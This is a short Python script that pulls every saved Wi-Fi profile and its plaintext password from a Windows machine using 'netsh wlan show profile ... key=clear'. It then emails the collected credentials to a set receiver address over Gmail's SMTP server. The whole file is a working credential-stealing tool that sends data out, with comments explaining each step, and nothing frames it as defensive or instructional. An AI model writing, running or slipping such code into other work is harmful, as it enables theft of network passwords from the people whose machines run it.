import subprocess
import smtplib
#calling netsh wlan show profiles from the cmd using the subprocess module and decode using utf-8 then split it on new line to get the result in list
data=subprocess.check_output(['netsh','wlan','show','profiles']).decode('utf-8').split('\n')
#the list comprehnesio is used to filter the results that don't have "all user profile" in them then split it to the get the right side
wifis=[line.split(':')[1][1:-1]for line in data if "All User Profile"in line]
fi=[]
#now we're looping into the profiles by calling the same command above but also passing the profile(SSID) and key=clear to show the password as a plain text then the result is
#added into a list to be sended by email later on

#an exception is thrown if an error comes up because the wifi is not decoded properly
for wifi in wifis:
    try:
        results=subprocess.check_output(['netsh','wlan','show','profile',wifi,'key=clear']).decode('utf-8').split('\n')
        results=[line.split(':')[1][1:-1]for line in results if "Key Content"in line]
        k=f'Name: {wifi}, password:{results[0]}'
        fi.append(k)
    except IndexError:
        m=f'Name: {wifi}, password: none'
    except subprocess.CalledProcessError:
        pass
#the list is converted to string then we open the mail protocol, log in, and then send the result by mail
fs='\n'.join(fi)
server=smtplib.SMTP_SSL("smtp.gmail.com",465)
server.login("sender_mail", "sender_pass")
server.sendmail("sender_mail", "receiver_mail", fs)
server.quit()